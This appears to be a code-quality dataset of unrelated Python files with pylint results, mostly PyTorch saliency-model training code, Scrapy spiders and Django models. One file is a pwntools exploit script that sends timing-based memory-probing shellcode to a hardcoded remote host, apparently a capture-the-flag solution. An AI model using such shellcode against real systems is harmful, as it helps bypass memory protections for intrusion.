136               l3 = criterion2(p3, gt2)
137               l2 = criterion2(p2, gt2)
138               l1 = criterion2(p1, gt2)
139   
140               loss0 = criterion(predict11, gt)
141               loss10 = criterion(predict10, gt)
142               loss9 = criterion(predict9, gt)
143               loss8 = criterion(predict8, gt)
144               loss7 = criterion(predict7, gt)
145               loss6 = criterion(predict6, gt)
146               loss5 = criterion(predict5, gt)
147               loss4 = criterion(predict4, gt)
148               loss3 = criterion(predict3, gt)
149               loss2 = criterion(predict2, gt)
150               loss1 = criterion(predict1, gt)
151   
152               total_loss = l1 + l2 + l3 + l4 + l5 + loss0 + loss1 + loss2 + loss3 + loss4 + loss5 + loss6 + loss7 + loss8 + loss9 + loss10
153   
154               total_loss.backward()
155               optimizer.step()
156   
157               total_loss_record.update(total_loss.item(), batch_size)
158               loss1_record.update(l5.item(), batch_size)
159               loss0_record.update(loss0.item(), batch_size)
160   
161               curr_iter += 1.0
162               batch_time.update(time.time() - end)
163               end = time.time()
164   
165               log = '[iter %d], [R1/Mode0], [total loss %.5f]\n' \
166                     '[l5 %.5f], [loss0 %.5f]\n' \
167                     '[lr %.13f], [time %.4f]' % \
168                     (curr_iter, total_loss_record.avg, loss1_record.avg, loss0_record.avg, optimizer.param_groups[1]['lr'],
169                      batch_time.avg)
170               print(log)
171               print('Num of class:', num_class)
172               open(log_path, 'a').write(log + '\n')
173   
174               if curr_iter == args['iter_num']:
175                   torch.save(net.state_dict(), os.path.join(ckpt_path, exp_name, '%d.pth' % curr_iter))
176                   torch.save(optimizer.state_dict(),
177                              os.path.join(ckpt_path, exp_name, '%d_optim.pth' % curr_iter))
178                   total_time = time.time() - start_time
179                   print(total_time)
180                   return
181   
182   
183   if __name__ == '__main__':
184       main()
","16 - error: no-name-in-module
80 - refactor: consider-using-with
80 - warning: unspecified-encoding
84 - refactor: too-many-locals
108 - warning: pointless-string-statement
172 - refactor: consider-using-with
172 - warning: unspecified-encoding
84 - refactor: too-many-statements
89 - warning: unused-variable
94 - warning: unused-variable
103 - warning: unused-variable
105 - warning: unused-variable
12 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
17 - warning: unused-import
18 - warning: unused-import
"
"1   import numpy as np
2   import os
3   
4   import torch
5   from PIL import Image
6   from torch.autograd import Variable
7   from torchvision import transforms
8   from torch.utils.data import DataLoader
9   import matplotlib.pyplot as plt
10   import pandas as pd
11   from tqdm import tqdm
12   import cv2
13   import numpy as np
14   
15   from config import ecssd_path, hkuis_path, pascals_path, sod_path, dutomron_path, MTDD_test_path
16   from misc import check_mkdir, crf_refine, AvgMeter, cal_precision_recall_mae, cal_fmeasure
17   from datasets import TestFolder_joint
18   import joint_transforms
19   from model import HSNet_single1, HSNet_single1_ASPP, HSNet_single1_NR, HSNet_single2, SDMS_A, SDMS_C
20   
21   torch.manual_seed(2018)
22   
23   # set which gpu to use
24   torch.cuda.set_device(0)
25   
26   ckpt_path = './ckpt' 
27   test_path = './test_ECSSD.csv'
28   
29   
30   def main():
31       img = np.zeros((512, 512),dtype = np.uint8)
32       img2 = cv2.imread('./0595.PNG', 0)
33       cv2.imshow('img',img2)
34       #cv2.waitKey(0)
35       print(img, img2)
36       Image.fromarray(img).save('./free.png')
37               
38   
39   
40   if __name__ == '__main__':
41       main()
","13 - warning: reimported
17 - error: no-name-in-module
2 - warning: unused-import
6 - warning: unused-import
7 - warning: unused-import
8 - warning: unused-import
9 - warning: unused-import
10 - warning: unused-import
11 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
16 - warning: unused-import
16 - warning: unused-import
16 - warning: unused-import
16 - warning: unused-import
16 - warning: unused-import
17 - warning: unused-import
18 - warning: unused-import
19 - warning: unused-import
19 - warning: unused-import
19 - warning: unused-import
19 - warning: unused-import
19 - warning: unused-import
19 - warning: unused-import
"
"1   import os
2   import os.path
3   
4   import torch.utils.data as data
5   from PIL import Image
6   
7   
8   class ImageFolder_joint(data.Dataset):
9       # image and gt should be in the same folder and have same filename except extended name (jpg and png respectively)
10       def __init__(self, label_list, joint_transform=None, transform=None, target_transform=None):
11           imgs = []
12           self.label_list = label_list
13           for index, row in label_list.iterrows():
14               imgs.append((row['img_path'], row['gt_path'], row['label']))
15           self.imgs = imgs
16           self.joint_transform = joint_transform
17           self.transform = transform
18           self.target_transform = target_transform
19   
20       def __len__(self):
21           return len(self.label_list)
22   
23       def __getitem__(self, index):
24           img_path, gt_path, label = self.imgs[index]
25           img = Image.open(img_path).convert('RGB')
26           target = Image.open(gt_path).convert('L')
27           if self.joint_transform is not None:
28               img, target = self.joint_transform(img, target)
29           if self.transform is not None:
30               img = self.transform(img)
31           if self.target_transform is not None:
32               target = self.target_transform(target)
33   
34           return img, target, label
35   
36   class ImageFolder_joint_for_edge(data.Dataset):
37       # image and gt should be in the same folder and have same filename except extended name (jpg and png respectively)
38       def __init__(self, label_list, joint_transform=None, transform=None, target_transform=None):
39           imgs = []
40           for index, row in label_list.iterrows():
41               imgs.append((row['img_path'], row['gt_path'], row['label']))
42           self.imgs = imgs
43           self.joint_transform = joint_transform
44           self.transform = transform
45           self.target_transform = target_transform
46   
47       def __getitem__(self, index):
48           img_path, gt_path, label = self.imgs[index]
49           edge_path = "".""+gt_path.split(""."")[1]+""_edge.""+gt_path.split(""."")[2]
50           img = Image.open(img_path).convert('RGB')
51           target = Image.open(gt_path).convert('L')
52           target_edge = Image.open(edge_path).convert('L')
53           if self.joint_transform is not None:
54               if img.size != target.size or img.size != target_edge.size:
55                   print(""error path:"", img_path, gt_path)
56                   print(""size:"", img.size, target.size, target_edge.size)
57               img, target, target_edge = self.joint_transform(img, target, target_edge)
58           if self.transform is not None:
59               img = self.transform(img)
60           if self.target_transform is not None:
61               target = self.target_transform(target)
62               target_edge = self.target_transform(target_edge)
63   
64           return img, target, target_edge, label
65   
66       def __len__(self):
67           return len(self.imgs)
68   
69   class TestFolder_joint(data.Dataset):
70       # image and gt should be in the same folder and have same filename except extended name (jpg and png respectively)
71       def __init__(self, label_list, joint_transform=None, transform=None, target_transform=None):
72           imgs = []
73           for index, row in label_list.iterrows():
74               imgs.append((row['img_path'], row['gt_path'], row['label']))
75           self.imgs = imgs
76           self.joint_transform = joint_transform
77           self.transform = transform
78           self.target_transform = target_transform
79   
80       def __getitem__(self, index):
81           img_path, gt_path, label = self.imgs[index]
82           img = Image.open(img_path).convert('RGB')
83           target = Image.open(gt_path).convert('L')
84           if self.joint_transform is not None:
85               img, target = self.joint_transform(img, target)
86           if self.transform is not None:
87               img = self.transform(img)
88           if self.target_transform is not None:
89               target = self.target_transform(target)
90   
91           return img, target, label, img_path
92   
93       def __len__(self):
94           return len(self.imgs)
95   
96   
97   def make_dataset(root):
98       img_list = [os.path.splitext(f)[0] for f in os.listdir(root) if f.endswith('.jpg')]
99       return [(os.path.join(root, img_name + '.jpg'), os.path.join(root, img_name + '.png')) for img_name in img_list]
100   
101   
102   class ImageFolder(data.Dataset):
103       # image and gt should be in the same folder and have same filename except extended name (jpg and png respectively)
104       def __init__(self, root, joint_transform=None, transform=None, target_transform=None):
105           self.root = root
106           self.imgs = make_dataset(root)
107           self.joint_transform = joint_transform
108           self.transform = transform
109           self.target_transform = target_transform
110   
111       def __getitem__(self, index):
112           img_path, gt_path = self.imgs[index]
113           img = Image.open(img_path).convert('RGB')
114           target = Image.open(gt_path).convert('L')
115           if self.joint_transform is not None:
116               img, target = self.joint_transform(img, target)
117           if self.transform is not None:
118               img = self.transform(img)
119           if self.target_transform is not None:
120               target = self.target_transform(target)
121   
122           return img, target
123   
124       def __len__(self):
125           return len(self.imgs)
","4 - refactor: consider-using-from-import
13 - warning: unused-variable
40 - warning: unused-variable
73 - warning: unused-variable
"
"1   import numpy as np
2   import os
3   
4   import torch
5   from PIL import Image
6   from torch.autograd import Variable
7   from torchvision import transforms
8   from torch.utils.data import DataLoader
9   import matplotlib.pyplot as plt
10   import pandas as pd
11   from tqdm import tqdm
12   
13   path_list = ['msra10k', 'ECSSD', 'DUT-OMROM', 'DUTS-TR', 'DUTS-TE', 'HKU-IS', 'PASCAL-S', 'SED2', 'SOC', 'SOD', 'THUR-15K']
14   
15   def main():
16       Dataset, Class0, Class1, Class2, Class3, Class4, Class5, Class6, Class7, Class8, Class9, Class10, Total = [], [], [], [], [], [], [], [], [], [], [], [], []
17       for data_path in path_list:
18           test_path = './SOD_label/label_' + data_path + '.csv'
19           print('Evalute for ' + test_path)
20           test_data = pd.read_csv(test_path)
21           imgs = []
22           num, c0, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10 = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
23           for index, row in test_data.iterrows():
24               imgs.append((row['img_path'], row['gt_path'], row['label']))
25               img_path, gt_path, label = imgs[index]
26   
27               if label == 0:
28                   c0 += 1
29               elif label == 1:
30                   c1 += 1
31               elif label == 2:
32                   c2 += 1
33               elif label == 3:
34                   c3 += 1
35               elif label == 4:
36                   c4 += 1
37               elif label == 5:
38                   c5 += 1
39               elif label == 6:
40                   c6 += 1
41               elif label == 7:
42                   c7 += 1
43               elif label == 8:
44                   c8 += 1
45               elif label == 9:
46                   c9 += 1
47               elif label == 10:
48                   c10 += 1
49               num += 1
50           print('[Class0 %.f], [Class1 %.f], [Class2 %.f], [Class3 %.f]\n'\
51                 '[Class4 %.f], [Class5 %.f], [Class6 %.f], [Class7 %.f]\n'\
52                 '[Class8 %.f], [Class9 %.f], [Class10 %.f], [Total %.f]\n'%\
53                 (c0, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, num)
54                 )
55           Dataset.append(data_path)
56           Class0.append(c0)
57           Class1.append(c1)
58           Class2.append(c2)
59           Class3.append(c3)
60           Class4.append(c4)
61           Class5.append(c5)
62           Class6.append(c6)
63           Class7.append(c7)
64           Class8.append(c8)
65           Class9.append(c9)
66           Class10.append(c10)
67           Total.append(num)
68   
69       label_file = pd.DataFrame({'Datasets': Dataset, 'Class 0': Class0, 'Class 1': Class1, 'Class 2': Class2, 'Class 3': Class3, 'Class 4': Class4, 'Class 5': Class5, 'Class 6': Class6, 'Class 7': Class7, 'Class 8': Class8, 'Class 9': Class9, 'Class 10': Class10, 'Num of Pic': Total})
70       label_file = label_file[['Datasets', 'Class 0', 'Class 1', 'Class 2', 'Class 3', 'Class 4', 'Class 5', 'Class 6', 'Class 7', 'Class 8', 'Class 9', 'Class 10', 'Num of Pic']]
71   
72       label_file.to_csv('./Dataset_statistics.csv', index=False)
73   
74   if __name__ == '__main__':
75       main()
","15 - refactor: too-many-locals
15 - refactor: too-many-branches
25 - warning: unused-variable
25 - warning: unused-variable
1 - warning: unused-import
2 - warning: unused-import
4 - warning: unused-import
5 - warning: unused-import
6 - warning: unused-import
7 - warning: unused-import
8 - warning: unused-import
9 - warning: unused-import
11 - warning: unused-import
"
"1   from setuptools import setup
2   
3   setup(
4       name='pyhfss_parser',
5       version='0.0.0',
6       packages=['', 'venv.Lib.site-packages.py', 'venv.Lib.site-packages.py._io', 'venv.Lib.site-packages.py._log',
7                 'venv.Lib.site-packages.py._code', 'venv.Lib.site-packages.py._path',
8                 'venv.Lib.site-packages.py._process', 'venv.Lib.site-packages.py._vendored_packages',
9                 'venv.Lib.site-packages.pip', 'venv.Lib.site-packages.pip._vendor',
10                 'venv.Lib.site-packages.pip._vendor.idna', 'venv.Lib.site-packages.pip._vendor.pytoml',
11                 'venv.Lib.site-packages.pip._vendor.certifi', 'venv.Lib.site-packages.pip._vendor.chardet',
12                 'venv.Lib.site-packages.pip._vendor.chardet.cli', 'venv.Lib.site-packages.pip._vendor.distlib',
13                 'venv.Lib.site-packages.pip._vendor.distlib._backport', 'venv.Lib.site-packages.pip._vendor.msgpack',
14                 'venv.Lib.site-packages.pip._vendor.urllib3', 'venv.Lib.site-packages.pip._vendor.urllib3.util',
15                 'venv.Lib.site-packages.pip._vendor.urllib3.contrib',
16                 'venv.Lib.site-packages.pip._vendor.urllib3.contrib._securetransport',
17                 'venv.Lib.site-packages.pip._vendor.urllib3.packages',
18                 'venv.Lib.site-packages.pip._vendor.urllib3.packages.backports',
19                 'venv.Lib.site-packages.pip._vendor.urllib3.packages.ssl_match_hostname',
20                 'venv.Lib.site-packages.pip._vendor.colorama', 'venv.Lib.site-packages.pip._vendor.html5lib',
21                 'venv.Lib.site-packages.pip._vendor.html5lib._trie',
22                 'venv.Lib.site-packages.pip._vendor.html5lib.filters',
23                 'venv.Lib.site-packages.pip._vendor.html5lib.treewalkers',
24                 'venv.Lib.site-packages.pip._vendor.html5lib.treeadapters',
25                 'venv.Lib.site-packages.pip._vendor.html5lib.treebuilders', 'venv.Lib.site-packages.pip._vendor.lockfile',
26                 'venv.Lib.site-packages.pip._vendor.progress', 'venv.Lib.site-packages.pip._vendor.requests',
27                 'venv.Lib.site-packages.pip._vendor.packaging', 'venv.Lib.site-packages.pip._vendor.cachecontrol',
28                 'venv.Lib.site-packages.pip._vendor.cachecontrol.caches',
29                 'venv.Lib.site-packages.pip._vendor.webencodings', 'venv.Lib.site-packages.pip._vendor.pkg_resources',
30                 'venv.Lib.site-packages.pip._internal', 'venv.Lib.site-packages.pip._internal.req',
31                 'venv.Lib.site-packages.pip._internal.vcs', 'venv.Lib.site-packages.pip._internal.utils',
32                 'venv.Lib.site-packages.pip._internal.models', 'venv.Lib.site-packages.pip._internal.commands',
33                 'venv.Lib.site-packages.pip._internal.operations', 'venv.Lib.site-packages.attr',
34                 'venv.Lib.site-packages.pluggy', 'venv.Lib.site-packages._pytest', 'venv.Lib.site-packages._pytest.mark',
35                 'venv.Lib.site-packages._pytest._code', 'venv.Lib.site-packages._pytest.config',
36                 'venv.Lib.site-packages._pytest.assertion', 'venv.Lib.site-packages.colorama',
37                 'venv.Lib.site-packages.atomicwrites', 'venv.Lib.site-packages.parsimonious',
38                 'venv.Lib.site-packages.parsimonious.tests', 'venv.Lib.site-packages.more_itertools',
39                 'venv.Lib.site-packages.more_itertools.tests', 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip',
40                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip.req',
41                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip.vcs',
42                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip.utils',
43                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip.compat',
44                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip.models',
45                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor',
46                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.distlib',
47                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.distlib._backport',
48                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.colorama',
49                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.html5lib',
50                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.html5lib._trie',
51                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.html5lib.filters',
52                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.html5lib.treewalkers',
53                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.html5lib.treeadapters',
54                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.html5lib.treebuilders',
55                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.lockfile',
56                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.progress',
57                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.requests',
58                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.requests.packages',
59                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.requests.packages.chardet',
60                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.requests.packages.urllib3',
61                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.requests.packages.urllib3.util',
62                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.requests.packages.urllib3.contrib',
63                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.requests.packages.urllib3.packages',
64                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.requests.packages.urllib3.packages.ssl_match_hostname',
65                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.packaging',
66                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.cachecontrol',
67                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.cachecontrol.caches',
68                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.webencodings',
69                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip._vendor.pkg_resources',
70                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip.commands',
71                 'venv.Lib.site-packages.pip-9.0.1-py3.7.egg.pip.operations'],
72       url='',
73       license='MIT',
74       author='Ariksu',
75       author_email='ariksu@gmail.com',
76       description='Attempt to write peg-parser for .hfss'
77   )
","Clean Code: No Issues Detected
"
"1   from pwn import *
2   import time
3   
4   context.update(arch='x86', bits=64)
5   
6   iteration = 0x1000
7   cache_cycle = 0x10000000
8   
9   shellcode = asm('''
10   _start:
11   mov rdi, 0x200000000
12   mov rsi, 0x300000000
13   mov rbp, 0
14   loop_start:
15   rdtsc
16   shl rdx, 32
17   or rax, rdx
18   push rax
19   mov rax, rdi
20   mov rdx, %d
21   a:
22   mov rcx, 0x1000
23   a2:
24   prefetcht1 [rax+rcx]
25   loop a2
26   dec edx
27   cmp edx, 0
28   ja a
29   b:
30   rdtsc
31   shl rdx, 32
32   or rax, rdx
33   pop rbx
34   sub rax, rbx
35   cmp rax, %d
36   jb exists
37   mov byte ptr [rsi], 1
38   jmp next
39   exists:
40   mov byte ptr [rsi], 0
41   next:
42   inc rsi
43   inc rbp
44   add rdi, 0x2000
45   cmp rbp, 64
46   jne loop_start
47   end:
48   int3
49   ''' % (iteration, cache_cycle))
50   HOST, PORT = '0.0.0.0', 31337
51   HOST, PORT = '202.120.7.198', 13579
52   r = remote(HOST, PORT)
53   p = time.time()
54   r.send(p32(len(shellcode)) + shellcode)
55   print r.recvall()
56   print time.time() - p
57   
","55 - error: syntax-error
"
"1   assembly = '''
2   7328-  400560:  c5 f9 6e c7             vmovd  %edi,%xmm0
3   7378-  400564:  c4 e2 7d 58 c0          vpbroadcastd %xmm0,%ymm0
4   7435-  400569:  c5 fd 76 0e             vpcmpeqd (%rsi),%ymm0,%ymm1
5   7495-  40056d:  c5 fd 76 56 20          vpcmpeqd 0x20(%rsi),%ymm0,%ymm2
6   7559-  400572:  c5 fd 76 5e 40          vpcmpeqd 0x40(%rsi),%ymm0,%ymm3
7   7623-  400577:  c5 fd 76 86 80 00 00    vpcmpeqd 0x80(%rsi),%ymm0,%ymm0
8   7687-  40057e:  00
9   7701-  40057f:  c5 f5 6b ca             vpackssdw %ymm2,%ymm1,%ymm1
10   7761-  400583:  c5 e5 6b c0             vpackssdw %ymm0,%ymm3,%ymm0
11   7821-  400587:  c5 f5 63 c0             vpacksswb %ymm0,%ymm1,%ymm0
12   7881-  40058b:  c5 fd d7 c0             vpmovmskb %ymm0,%eax
13   7934-  40058f:  c5 f8 77                vzeroupper
14   '''
15   
16   print(assembly)
17   lines = assembly.strip().splitlines()
18   i = 0
19   while True:
20       if i >= len(lines):
21           break
22       line = lines[i]
23       i += 1
24       line = line[line.find(':') + 3:]
25       byte1 = line[:2] if len(line) >= 2 else '  '
26       byte2 = line[3:5] if len(line) >= 5 else '  '
27       byte3 = line[6:8] if len(line) >= 8 else '  '
28       byte4 = line[9:11] if len(line) >= 11 else '  '
29       byte5 = line[12:14] if len(line) >= 14 else '  '
30       byte6 = line[15:17] if len(line) >= 17 else '  '
31       byte7 = line[18:20] if len(line) >= 20 else '  '
32       if byte6 != '  ':
33           comment = line[24:]
34           line = lines[i]
35           i += 1
36           line = line[line.find(':') + 3:]
37           byte8 = line[:2] if len(line) >= 2 else '  '
38           print('    QUAD $0x%s%s%s%s%s%s%s%s // %s' % (byte8, byte7, byte6, byte5, byte4, byte3, byte2, byte1, comment))
39       elif byte5 != '  ':
40           print('    LONG $0x%s%s%s%s; BYTE $0x%s // %s' % (byte4, byte3, byte2, byte1, byte5, line[24:]))
41       elif byte4 != '  ':
42           print('    LONG $0x%s%s%s%s // %s' % (byte4, byte3, byte2, byte1, line[24:]))
43       elif byte3 != '  ':
44           print('    WORD $0x%s%s; BYTE $0x%s // %s' % (byte2, byte1, byte3, line[24:]))
","Clean Code: No Issues Detected
"
"1   from white_board import WhiteBoard
2   import json
3   
4   '''
5   This file is used to run locally or to debug
6   '''
7   
8   with open('config.json') as json_file:
9       start_config = json.load(json_file)
10   
11   
12   def main():
13       board = WhiteBoard(""client"", start_config)
14       board.start_local()
15   
16   
17   if __name__ == '__main__':
18       main()
","4 - warning: pointless-string-statement
8 - warning: unspecified-encoding
"
"1   import socket
2   import json
3   import sys
4   import math
5   from white_board import WhiteBoard, binary_to_dict
6   
7   '''
8   Ouverture de la configuration initiale stockée dans config.json qui contient le mode d'écriture, la couleur et
9    la taille d'écriture. 
10   Ces Paramètres sont ensuite à modifier par l'utisateur dans l'interface pygame
11   '''
12   
13   with open('config.json') as json_file:
14       start_config = json.load(json_file)
15   
16   '''
17   définition de l'adresse IP du serveur. Ici le serveur est en local.
18   '''
19   hote = start_config[""ip_serveur""]
20   
21   port = 5001
22   
23   
24   def main():
25       """"""
26       Création d'un socket pour communiquer via un protocole TCP/IP
27       """"""
28       connexion_avec_serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
29       # Connexion au serveur
30       try:
31           connexion_avec_serveur.connect((hote, port))
32       except (TimeoutError, ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError) as e:
33           return print(""Le serveur n'a pas répondu, vérifiez les paramètres de connexion"")
34       print(""Connexion réussie avec le serveur"")
35   
36       # First get the client id
37       username = binary_to_dict(connexion_avec_serveur.recv(2 ** 16))[""client_id""]
38   
39       # Second get the message size
40       msg_recu = connexion_avec_serveur.recv(2 ** 8)
41       message_size = binary_to_dict(msg_recu)[""message_size""]
42   
43       # Then get the first chunk of history using the number of byte equal to the power of 2 just above its size
44       msg_recu = connexion_avec_serveur.recv(2 ** int(math.log(message_size, 2) + 1))
45       total_size_received = sys.getsizeof(msg_recu)
46   
47       # One we get the first chunk, we loop until we get the whole history
48       while total_size_received < message_size:
49           msg_recu += connexion_avec_serveur.recv(2 ** int(math.log(message_size, 2) + 1))
50   
51           total_size_received = sys.getsizeof(msg_recu)
52       msg_decode = binary_to_dict(msg_recu)
53       hist = msg_decode
54   
55       # Après réception de l'état du whiteboard, c'est à dire des figures et textboxes déjà dessinées par des utilisateurs
56       # précédents, le programme lance un whiteboard
57       whiteboard = WhiteBoard(username, start_config, hist)
58       whiteboard.start(connexion_avec_serveur)
59   
60   
61   if __name__ == '__main__':
62       main()
","7 - warning: pointless-string-statement
13 - warning: unspecified-encoding
16 - warning: pointless-string-statement
24 - refactor: inconsistent-return-statements
32 - warning: unused-variable
"
"1   from oauth2_provider.views.generic import ProtectedResourceView
2   from django.http import HttpResponse","1 - warning: unused-import
2 - warning: unused-import
"
"1   # This script is written under the username admin, with project name Retrofm
2   # Change the class name AdminRetrofmSpider accordingly
3   import datetime
4   
5   _start_date = datetime.date(2012, 12, 25)
6   _initial_date = datetime.date(2012, 12, 25)
7   _priority = 0
8   start_urls = ['http://retrofm.ru']
9   
10   
11   def parse(self, response):
12       while AdminRetrofmSpider._start_date < self.datetime.date.today():
13           AdminRetrofmSpider._priority -= 1
14           AdminRetrofmSpider._start_date += self.datetime.timedelta(days=1)
15           theurlstart = 'http://retrofm.ru/index.php?go=Playlist&date=%s' % (
16           AdminRetrofmSpider._start_date.strftime(""%d.%m.%Y""))
17           theurls = []
18           theurls.append(theurlstart + '&time_start=17%3A00&time_stop=23%3A59')
19           theurls.append(theurlstart + '&time_start=11%3A00&time_stop=17%3A01')
20           theurls.append(theurlstart + '&time_start=05%3A00&time_stop=11%3A01')
21           theurls.append(theurlstart + '&time_start=00%3A00&time_stop=05%3A01')
22   
23           for theurl in theurls:
24               request = Request(theurl, method=""GET"",
25                                 dont_filter=True, priority=(AdminRetrofmSpider._priority), callback=self.parse)
26               self.insert_link(request)","12 - warning: protected-access
12 - error: undefined-variable
13 - error: undefined-variable
14 - error: undefined-variable
16 - warning: protected-access
16 - error: undefined-variable
24 - error: undefined-variable
25 - warning: protected-access
25 - error: undefined-variable
11 - warning: unused-argument
"
"1   # -*- coding: utf-8 -*-
2   
3   # Define here the models for your scraped items
4   #
5   # See documentation in:
6   # https://doc.scrapy.org/en/latest/topics/items.html
7   
8   import scrapy
9   from scrapy.item import Item ,Field
10   
11   from scrapy.loader import ItemLoader 
12   from scrapy.loader.processors import TakeFirst, MapCompose, Join  
13   
14   class DemoLoader(ItemLoader):  
15      default_output_processor = TakeFirst()  
16      title_in = MapCompose(unicode.title) 
17      title_out = Join()  
18      size_in = MapCompose(unicode.strip)  
19      # you can continue scraping here
20   class DemoItem(scrapy.Item):
21       
22   
23       # define the fields for your item here like:
24       product_title = scrapy.Field()
25       product_link = scrapy.Field()
26   
27       product_description = scrapy.Field()
28   
29       pass
","15 - warning: bad-indentation
16 - warning: bad-indentation
17 - warning: bad-indentation
18 - warning: bad-indentation
16 - error: undefined-variable
18 - error: undefined-variable
14 - refactor: too-few-public-methods
29 - warning: unnecessary-pass
20 - refactor: too-few-public-methods
9 - warning: unused-import
9 - warning: unused-import
"
"1   from django.db import models
2   from blog.models import Post
3   # Creating a comment systems
4   class Comment(models.Model):
5       post = models.ForeignKey(Post,
6                      on_delete=models.CASCADE,
7                      related_name='comments')
8       name=models.CharField(max_length=200)
9       email=models.EmailField()
10       body=models.TextField()
11       created=models.DateTimeField(auto_now_add=True)
12       updated=models.DateTimeField(auto_now_add=True)
13       active=models.BooleanField(default=True)
14   
15       class Meta:
16           ordering=('created',)
17   
18       def __str__(self):
19           return f'comment by {self.name}on{self.post}'   
20       
21   
","15 - refactor: too-few-public-methods
4 - refactor: too-few-public-methods
"
"1   from django.db import models
2   from django.contrib.auth.models import User
3   
4   
5   class Project(models.Model):
6       project_name = models.CharField(max_length=50)
7       user = models.ForeignKey(User)
8       link_generator = models.TextField(blank=True)
9       scraper_function = models.TextField(blank=True)
10       settings_scraper = models.TextField(blank=True)
11       settings_link_generator = models.TextField(blank=True)
12   
13       def __str__(self):
14           return ""%s by %s"" % (self.project_name, self.user.username)
15   
16   
17   class Item(models.Model):
18       item_name = models.CharField(max_length=50)
19       project = models.ForeignKey(Project, on_delete=models.CASCADE)
20   
21       def __str__(self):
22           return self.item_name
23   
24   
25   class Field(models.Model):
26       field_name = models.CharField(max_length=50)
27       item = models.ForeignKey(Item, on_delete=models.CASCADE)
28   
29       def __str__(self):
30           return self.field_name
31   
32   
33   class Pipeline(models.Model):
34       pipeline_name = models.CharField(max_length=50)
35       pipeline_order = models.IntegerField()
36       pipeline_function = models.TextField(blank=True)
37       project = models.ForeignKey(Project, on_delete=models.CASCADE)
38   
39       def __str__(self):
40           return self.pipeline_name
41   
42   
43   class LinkgenDeploy(models.Model):
44       project = models.ForeignKey(Project, on_delete=models.CASCADE)
45       success = models.BooleanField(blank=False)
46       date = models.DateTimeField(auto_now_add=True)
47       version = models.IntegerField(blank=False, default=0)
48   
49   
50   class ScrapersDeploy(models.Model):
51       project = models.ForeignKey(Project, on_delete=models.CASCADE)
52       success = models.TextField(blank=True)
53       date = models.DateTimeField(auto_now_add=True)
54       version = models.IntegerField(blank=False, default=0)
55   
56   
57   class Dataset(models.Model):
58       user = models.ForeignKey(User)
59       database = models.CharField(max_length=50)","5 - refactor: too-few-public-methods
17 - refactor: too-few-public-methods
25 - refactor: too-few-public-methods
33 - refactor: too-few-public-methods
43 - refactor: too-few-public-methods
50 - refactor: too-few-public-methods
57 - refactor: too-few-public-methods
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   -------------------------------------------------
4      File Name：     custom_filter.py  
5      Description :  
6      Author :       JHao
7      date：          2017/4/14
8   -------------------------------------------------
9      Change Activity:
10                      2017/4/14: 
11   -------------------------------------------------
12   """"""
13   __author__ = 'JHao'
14   
15   import markdown
16   from django import template
17   from django.utils.safestring import mark_safe
18   from django.template.defaultfilters import stringfilter
19   
20   register = template.Library()
21   
22   
23   @register.filter
24   def slice_list(value, index):
25       return value[index]
26   
27   
28   @register.filter(is_safe=True)
29   @stringfilter
30   def custom_markdown(value):
31       content = mark_safe(markdown.markdown(value,
32                                             output_format='html5',
33                                             extensions=[
34                                                 'markdown.extensions.extra',
35                                                 'markdown.extensions.fenced_code',
36                                                 'markdown.extensions.tables',
37                                             ],
38                                             safe_mode=True,
39                                             enable_attributes=False))
40       return content
41   
42   
43   @register.filter
44   def tag2string(value):
45       """"""
46       将Tag转换成string >'python,爬虫'
47       :param value:
48       :return:
49       """"""
50       return ','.join([each.get('tag_name', '') for each in value])
51   
52   
53   if __name__ == '__main__':
54       pass
","Clean Code: No Issues Detected
"
"1   import scrapy
2   from scrapy.spiders import CSVFeedSpider
3   from scrapy.spiders import SitemapSpider  
4   
5   from scrapy.spiders import CrawlSpider,Rule
6   from scrapy.linkextractor import LinkExtractor
7   from tuto.items import DemoItem
8   from scrapy.loader import ItemLoader 
9   from tuto.items import Demo  
10   
11   class DemoSpider(CrawlSpider):
12       name='demo'
13       allowed_domais=[""www.tutorialspoint.com""]
